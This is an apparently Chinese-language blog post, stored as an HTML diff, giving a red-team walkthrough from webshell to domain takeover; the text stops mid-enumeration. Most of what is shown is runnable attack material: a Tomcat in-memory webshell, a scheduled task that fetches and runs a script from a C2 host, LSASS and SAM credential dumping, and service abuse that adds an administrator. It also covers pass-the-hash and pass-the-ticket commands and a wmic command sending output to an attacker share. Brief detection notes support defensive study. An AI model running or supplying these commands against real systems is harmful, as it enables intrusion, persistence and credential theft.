@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>从 Webshell 到域控：红队内网横向移动全路径技术复盘 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>从 Webshell 到域控：红队内网横向移动全路径技术复盘</h1>
+<time>2026-08-04</time>
+<ul>
+<li>技术
+Slug: 从webshell到域控-红队内网横向移动全路径技术复盘</li>
+</ul>
+<hr />
+<h2>目录</h2>
+<ul>
+<li><a href="#1-背景">1. 背景</a></li>
+<li><a href="#2-攻击链全景图">2. 攻击链全景图</a></li>
+<li><a href="#3-第一阶段webshell-落点与初始立足">3. 第一阶段：Webshell 落点与初始立足</a></li>
+<li><a href="#4-第二阶段本机信息收集与提权">4. 第二阶段：本机信息收集与提权</a></li>
+<li><a href="#5-第三阶段内网横向移动">5. 第三阶段：内网横向移动</a></li>
+<li><a href="#6-第四阶段域信息收集与-kerberos-攻击">6. 第四阶段：域信息收集与 Kerberos 攻击</a></li>
+<li><a href="#7-检测与加固方案">7. 检测与加固方案</a></li>
+<li><a href="#8-总结">8. 总结</a></li>
+<li><a href="#9-免责声明">9. 免责声明</a></li>
+</ul>
+<hr />
+<h2>1. 背景</h2>
+<p>在企业红队评估中，攻击者往往无法直接获得域内高权限账户，而是从一个暴露在公网的 Web 应用漏洞切入，以一个低权限的 Webshell 作为起点，逐步完成<strong>立足 → 提权 → 横向 → 域控接管</strong>的完整链条。这条链路的可怕之处在于：每一个环节的"小问题"——一个文件上传、一个服务配置错误、一个过度委派的账户——都会被攻击者串联成一条通往域控的高速公路。</p>
+<p>本文覆盖 MITRE ATT&amp;CK 框架中的多个关键技术点：</p>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>ATT&amp;CK 技术</th>
+<th>编号</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>初始立足</td>
+<td>Exploit Public-Facing Application</td>
+<td>T1190</td>
+</tr>
+<tr>
+<td>持久化</td>
+<td>Boot or Logon Autostart Execution</td>
+<td>T1547</td>
+</tr>
+<tr>
+<td>凭据提取</td>
+<td>OS Credential Dumping: LSASS / SAM</td>
+<td>T1003.001 / T1003.002</td>
+</tr>
+<tr>
+<td>提权</td>
+<td>Abuse Elevation Control Mechanism</td>
+<td>T1548</td>
+</tr>
+<tr>
+<td>横向移动</td>
+<td>Pass the Hash / Pass the Ticket</td>
+<td>T1550.002 / T1550.003</td>
+</tr>
+<tr>
+<td>域信息收集</td>
+<td>Domain Trust Discovery</td>
+<td>T1482</td>
+</tr>
+<tr>
+<td>Kerberos 攻击</td>
+<td>AS-REP Roasting / Kerberoasting</td>
+<td>T1558.004 / T1558.003</td>
+</tr>
+<tr>
+<td>域控接管</td>
+<td>DCSync / Golden Ticket</td>
+<td>T1003.006 / T1558.001</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>2. 攻击链全景图</h2>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────────┐
+│                        红队内网攻击链全景                            │
+└─────────────────────────────────────────────────────────────────────┘
+
+  [公网暴露 Web 应用]
+         │
+         │  文件上传 / RCE / 反序列化
+         ▼
+  ┌──────────────┐
+  │ Webshell 落点 │ ◄── T1190 初始立足
+  └──────┬───────┘
+         │
+         ▼
+  ┌──────────────────┐     ┌─────────────────────┐
+  │ 本机信息收集      │ ──► │ 本机提权             │
+  │ whoami/systeminfo │     │ 服务配置/DLL劫持     │
+  └──────┬───────────┘     └─────────┬───────────┘
+         │                            │
+         ▼                            ▼
+  ┌──────────────────┐     ┌─────────────────────┐
+  │ 凭据获取          │ ◄── │ LSASS dump / SAM    │
+  │ 明文/哈希/票据    │     │ 注册表转储           │
+  └──────┬───────────┘     └─────────────────────┘
+         │
+         ▼
+  ┌──────────────────┐     ┌─────────────────────┐
+  │ 内网信息收集      │ ──► │ 横向移动             │
+  │ 端口/SMB/LDAP    │     │ PtH / PtT / WMI     │
+  └──────┬───────────┘     └─────────┬───────────┘
+         │                            │
+         ▼                            ▼
+  ┌──────────────────┐     ┌─────────────────────┐
+  │ 域信息收集        │ ──► │ Kerberos 攻击        │
+  │ BloodHound/ADFind│     │ AS-REP/Kerberoasting │
+  └──────┬───────────┘     └─────────┬───────────┘
+         │                            │
+         ▼                            ▼
+  ┌──────────────────────────────────────────────┐
+  │ 域控接管                                       │
+  │ DCSync → Golden/Silver Ticket → 全域沦陷      │
+  └──────────────────────────────────────────────┘
+
+  检测面：4624 / 4672 / 4768 / 4769 / 4662 / LSASS 访问 / 异常 RPC
+</code></pre></div>
+
+<hr />
+<h2>3. 第一阶段：Webshell 落点与初始立足</h2>
+<h3>3.1 Web 漏洞利用获得 Webshell</h3>
+<p>初始入口通常是以下三类漏洞之一：</p>
+<ul>
+<li><strong>文件上传漏洞</strong>：未校验后缀 / Content-Type / 文件头，或通过 <code>.htaccess</code>、解析漏洞绕过；</li>
+<li><strong>RCE 漏洞</strong>：命令注入（Struts2 OGNL、Spring SpEL）、模板注入（Freemarker SSTI）；</li>
+<li><strong>反序列化漏洞</strong>：Java（Fastjson、Shiro、WebLogic）、.NET（ViewState、BinaryFormatter）。</li>
+</ul>
+<p>以 Java 反序列化为例，攻击者通过 ysoserial 生成 payload 后投递，回弹一个基于内存的 Webshell（如冰蝎 / 哥斯拉的内存马），避免落盘被文件查杀拦截：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 内存马核心思路：注册恶意 Filter / Servlet 到 Tomcat StandardContext</span>
+<span class="c1">// 关键：不落盘、重启即消失，难以通过文件系统检测</span>
+<span class="n">Field</span><span class="w"> </span><span class="n">reqField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;request&quot;</span><span class="p">);</span>
+<span class="n">reqField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="n">Request</span><span class="w"> </span><span class="n">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Request</span><span class="p">)</span><span class="w"> </span><span class="n">reqField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>
+<span class="n">StandardContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getContext</span><span class="p">();</span>
+
+<span class="c1">// 动态注册 Filter</span>
+<span class="n">Filter</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Filter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">res</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;cmd&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 执行命令并回显</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">res</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1">// ... 省略 init / destroy</span>
+<span class="p">};</span>
+<span class="n">FilterDef</span><span class="w"> </span><span class="n">filterDef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterDef</span><span class="p">();</span>
+<span class="n">filterDef</span><span class="p">.</span><span class="na">setFilter</span><span class="p">(</span><span class="n">filter</span><span class="p">);</span>
+<span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="s">&quot;evil&quot;</span><span class="p">);</span>
+<span class="n">context</span><span class="p">.</span><span class="na">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span>
+<span class="n">FilterMap</span><span class="w"> </span><span class="n">filterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterMap</span><span class="p">();</span>
+<span class="n">filterMap</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="s">&quot;evil&quot;</span><span class="p">);</span>
+<span class="n">filterMap</span><span class="p">.</span><span class="na">addURLPattern</span><span class="p">(</span><span class="s">&quot;/*&quot;</span><span class="p">);</span>
+<span class="n">context</span><span class="p">.</span><span class="na">addFilterMap</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span>
+</code></pre></div>
+
+<h3>3.2 Webshell 权限评估</h3>
+<p>落点后第一步是评估当前权限上下文，判断是否为服务账户（可能已是域账户）、是否具备特权：</p>
+<div class="highlight"><pre><span></span><code>whoami /all
+whoami /priv
+whoami /groups
+hostname
+ipconfig /all
+systeminfo | findstr /B /C:&quot;OS&quot; /C:&quot;System Type&quot;
+</code></pre></div>
+
+<p>重点关注以下信息：</p>
+<ul>
+<li><strong>权限</strong>：<code>SeDebugPrivilege</code>（可直接读 LSASS）、<code>SeImpersonatePrivilege</code>（可 Potato 提权）；</li>
+<li><strong>组</strong>：是否在 <code>IIS_IUSRS</code>、<code>NETWORK SERVICE</code>、<code>LOCAL SERVICE</code>，是否已是域成员；</li>
+<li><strong>网络</strong>：是否双网卡（一张对外、一张对内），DNS 是否指向域控。</li>
+</ul>
+<h3>3.3 持久化</h3>
+<p>为防止会话中断丢失立足点，红队通常会做轻量持久化：</p>
+<div class="highlight"><pre><span></span><code><span class="p">::</span><span class="w"> </span><span class="err">方式</span><span class="mi">1</span><span class="err">：隐藏</span><span class="w"> </span><span class="n">Webshell</span><span class="err">（</span><span class="n">ADS</span><span class="w"> </span><span class="err">数据流，</span><span class="n">dir</span><span class="w"> </span><span class="err">看不到）</span>
+<span class="n">type</span><span class="w"> </span><span class="n">shell</span><span class="o">.</span><span class="n">aspx</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s2">&quot;C:\inetpub\wwwroot\legit.aspx:evil.aspx&quot;</span>
+
+<span class="p">::</span><span class="w"> </span><span class="err">方式</span><span class="mi">2</span><span class="err">：注册表自启（</span><span class="n">HKCU</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">HKLM</span><span class="w"> </span><span class="n">Run</span><span class="w"> </span><span class="err">键）</span>
+<span class="n">reg</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="s2">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">Update</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_SZ</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="s2">&quot;powershell -w hidden -enc &lt;base64&gt;&quot;</span><span class="w"> </span><span class="o">/</span><span class="n">f</span>
+
+<span class="p">::</span><span class="w"> </span><span class="err">方式</span><span class="mi">3</span><span class="err">：计划任务（每</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="err">分钟回连</span><span class="w"> </span><span class="n">C2</span><span class="err">）</span>
+<span class="n">schtasks</span><span class="w"> </span><span class="o">/</span><span class="n">create</span><span class="w"> </span><span class="o">/</span><span class="n">tn</span><span class="w"> </span><span class="s2">&quot;SystemUpdate&quot;</span><span class="w"> </span><span class="o">/</span><span class="n">tr</span><span class="w"> </span><span class="s2">&quot;powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://c2/payload.ps1&#39;)&quot;</span><span class="w"> </span><span class="o">/</span><span class="n">sc</span><span class="w"> </span><span class="n">minute</span><span class="w"> </span><span class="o">/</span><span class="n">mo</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="o">/</span><span class="n">ru</span><span class="w"> </span><span class="n">SYSTEM</span>
+</code></pre></div>
+
+<blockquote>
+<p>检测点：ADS 可通过 <code>dir /r</code> 或 Sysmon Event ID 11（文件创建）配合 <code>:.*</code> 模式检测；计划任务创建对应 Sysmon Event ID 1（进程创建）+ 命令行审计。</p>
+</blockquote>
+<hr />
+<h2>4. 第二阶段：本机信息收集与提权</h2>
+<h3>4.1 系统信息收集</h3>
+<div class="highlight"><pre><span></span><code>:: 系统版本、补丁情况（判断可利用提权漏洞）
+systeminfo
+wmic qfe list brief
+
+:: 网络拓扑（路由表、ARP、监听端口、已建立连接）
+route print
+arp -a
+netstat -ano
+ipconfig /all
+
+:: 进程与服务（寻找以 SYSTEM 运行的高权限进程、第三方服务）
+tasklist /svc
+wmic service list brief | findstr &quot;Running&quot;
+
+:: 已安装软件（识别可能存在漏洞的第三方应用）
+wmic product get name,version
+</code></pre></div>
+
+<p>补丁缺失对照是提权的关键。例如 <code>KB5001337</code> 缺失可能存在 PrintNightmare（CVE-2021-1675），<code>KB4577670</code> 缺失可能存在 SMBGhost（CVE-2020-0796）。</p>
+<h3>4.2 凭据提取</h3>
+<h4>4.2.1 LSASS 内存转储</h4>
+<p>LSASS（Local Security Authority Subsystem Service）进程内存中缓存了大量凭据：NTLM 哈希、Kerberos 票据、明文密码（取决于 WDigest 配置）。多种 dump 方式的对比：</p>
+<div class="highlight"><pre><span></span><code><span class="c"># 方法1：procdump（合规工具，签名绕过大部分 EDR）</span>
+<span class="n">procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-accepteula</span> <span class="n">-ma</span> <span class="n">lsass</span><span class="p">.</span><span class="n">exe</span> <span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span>
+
+<span class="c"># 方法2：PowerShell + MiniDumpWriteDump（不落盘可执行文件，纯托管调用）</span>
+<span class="nv">$signature</span> <span class="p">=</span> <span class="sh">@&quot;</span>
+<span class="sh">[DllImport(&quot;dbghelp.dll&quot;)]</span>
+<span class="sh">public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, </span>
+<span class="sh">    IntPtr hFile, uint DumpType, IntPtr ExceptionParam, </span>
+<span class="sh">    IntPtr UserStreamParam, uint UserStreamParamSize);</span>
+<span class="sh">&quot;@</span>
+<span class="nv">$type</span> <span class="p">=</span> <span class="nb">Add-Type</span> <span class="n">-MemberDefinition</span> <span class="nv">$signature</span> <span class="n">-Name</span> <span class="s2">&quot;MiniDump&quot;</span> <span class="n">-Namespace</span> <span class="s2">&quot;Win32&quot;</span> <span class="n">-PassThru</span>
+<span class="nv">$process</span> <span class="p">=</span> <span class="nb">Get-Process</span> <span class="n">lsass</span>
+<span class="nv">$file</span> <span class="p">=</span> <span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&quot;C:\Temp\lsass.dmp&quot;</span><span class="p">)</span>
+<span class="nv">$type</span><span class="p">::</span><span class="n">MiniDumpWriteDump</span><span class="p">(</span><span class="nv">$process</span><span class="p">.</span><span class="n">Handle</span><span class="p">,</span> <span class="nv">$process</span><span class="p">.</span><span class="n">Id</span><span class="p">,</span> <span class="nv">$file</span><span class="p">.</span><span class="n">SafeFileHandle</span><span class="p">.</span><span class="n">DangerousGetHandle</span><span class="p">(),</span> <span class="n">2</span><span class="p">,</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">,</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+<span class="nv">$file</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+
+<span class="c"># 方法3：comsvcs.dll（LOLBIN，系统自带 DLL，隐蔽性高）</span>
+<span class="n">rundll32</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">comsvcs</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span> <span class="n">MiniDump</span> <span class="p">(</span><span class="nb">Get-Process</span> <span class="n">lsass</span><span class="p">).</span><span class="n">id</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span> <span class="n">full</span>
+
+<span class="c"># 提取凭据</span>
+<span class="c"># mimikatz: sekurlsa::logonpasswords</span>
+<span class="c"># pypykatz（Python版）: pypykatz lsa minidump lsass.dmp</span>
+</code></pre></div>
+
+<p>三种方式的检测特征对比：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>落盘可执行文件</th>
+<th>检测特征</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>procdump</td>
+<td>是（需上传）</td>
+<td>进程名 procdump.exe + 命令行含 <code>lsass</code></td>
+</tr>
+<tr>
+<td>PowerShell MiniDump</td>
+<td>否</td>
+<td>PowerShell 进程访问 lsass.exe 句柄（Sysmon Event 10）</td>
+</tr>
+<tr>
+<td>comsvcs.dll</td>
+<td>否</td>
+<td>rundll32 + comsvcs.dll + MiniDump 命令行模式</td>
+</tr>
+</tbody>
+</table>
+<h4>4.2.2 注册表 SAM/SECURITY 转储</h4>
+<p>当 LSASS 受 Credential Guard 保护无法直接 dump 时，可转储注册表 hive 离线提取：</p>
+<div class="highlight"><pre><span></span><code><span class="o">::</span><span class="w"> </span><span class="err">使用</span><span class="w"> </span><span class="kt">reg</span><span class="w"> </span><span class="n">save</span><span class="err">（需</span><span class="w"> </span><span class="n">SYSTEM</span><span class="w"> </span><span class="err">权限）</span>
+<span class="kt">reg</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">hklm\sam</span><span class="w"> </span><span class="nl">C:</span><span class="n">\Temp\sam.hive</span>
+<span class="kt">reg</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">hklm\system</span><span class="w"> </span><span class="nl">C:</span><span class="n">\Temp\system.hive</span>
+<span class="kt">reg</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">hklm\security</span><span class="w"> </span><span class="nl">C:</span><span class="n">\Temp\security.hive</span>
+
+<span class="o">::</span><span class="w"> </span><span class="err">使用</span><span class="w"> </span><span class="n">esentutl</span><span class="err">（</span><span class="n">NTDS</span><span class="p">.</span><span class="n">dit</span><span class="w"> </span><span class="err">提取的替代方案）</span>
+<span class="n">esentutl</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">/</span><span class="n">y</span><span class="w"> </span><span class="o">/</span><span class="n">vss</span><span class="w"> </span><span class="nl">c:</span><span class="n">\Windows\NTDS\ntds.dit</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="nl">c:</span><span class="n">\Temp\ntds.dit</span>
+
+<span class="o">::</span><span class="w"> </span><span class="err">离线提取</span>
+<span class="p">#</span><span class="w"> </span><span class="n">impacket</span>
+<span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">sam</span><span class="w"> </span><span class="n">sam</span><span class="p">.</span><span class="n">hive</span><span class="w"> </span><span class="o">-</span><span class="n">system</span><span class="w"> </span><span class="n">system</span><span class="p">.</span><span class="n">hive</span><span class="w"> </span><span class="o">-</span><span class="n">security</span><span class="w"> </span><span class="n">security</span><span class="p">.</span><span class="n">hive</span><span class="w"> </span><span class="n">LOCAL</span>
+</code></pre></div>
+
+<h3>4.3 本机提权</h3>
+<p>常见的非漏洞类提权路径（配置错误，无需 Exp）：</p>
+<p><strong>Unquoted Service Path（未引用服务路径）：</strong></p>
+<p>当服务可执行路径含空格且未加引号（如 <code>C:\Program Files\My Service\svc.exe</code>），Windows 会依次尝试 <code>C:\Program.exe</code>、<code>C:\Program Files\My.exe</code>，若攻击者可在该目录写文件，即可提权：</p>
+<div class="highlight"><pre><span></span><code>:: 查找未引用服务路径
+wmic service get name,displayname,pathname,startmode | findstr /i &quot;auto&quot; | findstr /i /v &quot;c:\windows&quot;
+
+:: 检查目标目录写权限
+accesschk.exe -w -u &quot;Users&quot; &quot;C:\Program Files\&quot;
+</code></pre></div>
+
+<p><strong>服务权限配置错误：</strong></p>
+<div class="highlight"><pre><span></span><code>:: 枚举可被普通用户修改的服务
+accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
+
+:: 修改服务 binPath 执行命令（提权到 SYSTEM）
+sc config vulnerable_svc binpath= &quot;cmd.exe /c net localgroup administrators user /add&quot;
+sc stop vulnerable_svc
+sc start vulnerable_svc
+</code></pre></div>
+
+<p><strong>DLL 劧持：</strong> 识别 <code>SYSTEM</code> 权限服务加载的、不在系统保护目录下的 DLL，放置同名校的恶意 DLL 实现提权。</p>
+<blockquote>
+<p>若拥有 <code>SeImpersonatePrivilege</code>（IIS / SQL Server 服务账户常见），可使用 Potato 系列工具（RoguePotato / PrintSpoofer / GodPotato）直接提权至 SYSTEM。</p>
+</blockquote>
+<hr />
+<h2>5. 第三阶段：内网横向移动</h2>
+<h3>5.1 网络发现</h3>
+<p>拿到本机凭据后，攻击者开始在内网进行横向侦察：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 端口扫描（fscan 一键扫描内网存活与常见端口）</span>
+fscan<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.10.10.0/24
+
+<span class="c1"># SMB 枚举（探测共享、会话）</span>
+enum4linux-ng<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span>.10.10.20
+smbclient<span class="w"> </span>-L<span class="w"> </span>//10.10.10.20/<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;guest%&#39;</span>
+
+<span class="c1"># LDAP 查询（域内信息）</span>
+<span class="c1"># 匿名 LDAP 查询（若未限制）</span>
+ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.10.10.10<span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="s2">&quot;(objectclass=*)&quot;</span>
+
+<span class="c1"># 域内用户/计算机枚举</span>
+ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://dc01.corp.local<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(objectCategory=user)&quot;</span><span class="w"> </span>sAMAccountName<span class="w"> </span>memberOf
+ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://dc01.corp.local<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(objectCategory=computer)&quot;</span><span class="w"> </span>name<span class="w"> </span>operatingSystem
+</code></pre></div>
+
+<h3>5.2 传递哈希（Pass-the-Hash, PtH）</h3>
+<p>当拿到 NTLM 哈希但无法破解出明文时，可直接用哈希进行 NTLM 认证（无需破解）。这是内网横向最核心的技术之一。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Pass-the-Hash 横向移动</span>
+<span class="c1"># Impacket 工具链</span>
+python3<span class="w"> </span>psexec.py<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:NTHASH<span class="w"> </span>domain/user@target
+
+python3<span class="w"> </span>wmiexec.py<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:NTHASH<span class="w"> </span>domain/user@target
+
+python3<span class="w"> </span>smbexec.py<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:NTHASH<span class="w"> </span>domain/user@target
+
+<span class="c1"># CrackMapExec 批量验证（大规模横向）</span>
+crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-H<span class="w"> </span>NTHASH<span class="w"> </span>--shares
+
+<span class="c1"># WMI 横向移动（不走 SMB，绕过部分检测）</span>
+wmic<span class="w"> </span>/node:10.10.10.20<span class="w"> </span>/user:domain<span class="se">\u</span>ser<span class="w"> </span>/password:pass<span class="w"> </span>process<span class="w"> </span>call<span class="w"> </span>create<span class="w"> </span><span class="s2">&quot;cmd.exe /c whoami &gt; \\attacker\share\output.txt&quot;</span>
+</code></pre></div>
+
+<p>PtH 的本质：NTLM 协议在认证过程中使用哈希而非明文作为"证明"，因此拥有哈希等价于拥有密码。三种 Impacket 执行方式的区别：</p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>执行机制</th>
+<th>特征</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>psexec.py</td>
+<td>创建服务执行命令</td>
+<td>落地 <code>RemCom_*</code> 临时文件，留服务日志</td>
+</tr>
+<tr>
+<td>wmiexec.py</td>
+<td>WMI <code>Win32_Process.Create</code></td>
+<td>半交互式，通过 SMB 回传输出，无服务创建</td>
+</tr>
+<tr>
+<td>smbexec.py</td>
+<td>创建临时服务 + 命名管道回传</td>
+<td>与 psexec 类似但更隐蔽</td>
+</tr>
+</tbody>
+</table>
+<h3>5.3 传递票据（Pass-the-Ticket, PtT）</h3>
+<p>当拿到 Kerberos 票据（TGT / TGS）而非哈希时，可直接注入票据访问目标服务，完全绕过 AS-REQ 的预身份验证环节：</p>
+<div class="highlight"><pre><span></span><code><span class="c"># Mimikatz 注入票据</span>
+<span class="n">mimikatz</span> <span class="s2">&quot;kerberos::ptt ticket.kirbi&quot;</span> <span class="n">exit</span>
+
+<span class="c"># Rubeus（C# 实现，更隐蔽）</span>
+<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">base64_ticket</span>
+
+<span class="c"># 验证票据已注入</span>
+<span class="n">klist</span>
+
+<span class="c"># 访问目标</span>
+<span class="nb">dir </span><span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</code></pre></div>
+
+<h3>5.4 Overpass-the-Hash</h3>
+<p>将 NTLM 哈希"升级"为完整的 Kerberos TGT，以绕过仅允许 Kerberos 认证（禁用 NTLM）的环境：</p>
+<div class="highlight"><pre><span></span><code><span class="c"># Rubeus：用哈希请求 TGT</span>
+<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">username</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">NTHASH</span> <span class="p">/</span><span class="n">nowrap</span>
+
+<span class="c"># Mimikatz 等价操作</span>
+<span class="n">mimikatz</span> <span class="s2">&quot;sekurlsa::pth /user:username /domain:corp.local /ntlm:NTHASH /run:powershell.exe&quot;</span> <span class="n">exit</span>
+<span class="c"># 在弹出的 PowerShell 中执行 klist 触发 Kerberos 流程，获得 TGT</span>
+</code></pre></div>
+
+<hr />
+<h2>6. 第四阶段：域信息收集与 Kerberos 攻击</h2>
+<h3>6.1 AD 域信息收集</h3>
+<p>进入域环境后，首要任务是绘制域内"攻击路径图"——谁是域管、哪些账户有 DCSync 权限、是否存在 Kerberos 委派风险。</p>
+<div class="highlight"><pre><span></span><code><span class="c"># BloodHound 数据采集（SharpHound）</span>
+<span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">All</span> <span class="p">-</span><span class="n">-zipfilename</span> <span class="n">bloodhound</span><span class="p">.</span><span class="n">zip</span>
+<span class="c"># 或 PowerShell 版</span>
+<span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="n">-OutputDirectory</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span>
+
+<span class="c"># PowerView 手动枚举</span>
+<span class="c"># 查询域管组成员</span>
+<span class="nb">Get-NetGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span>
+
+<span class="c"># 查询所有域控</span>
+<span class="nb">Get-NetDomainController</span>
+
+<span class="c"># 查询会话（谁登录在哪台机器上，定位域管活动位置）</span>
+<span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="n">fileserver01</span>
+
+<span class="c"># ADFind（命令行域枚举）</span>
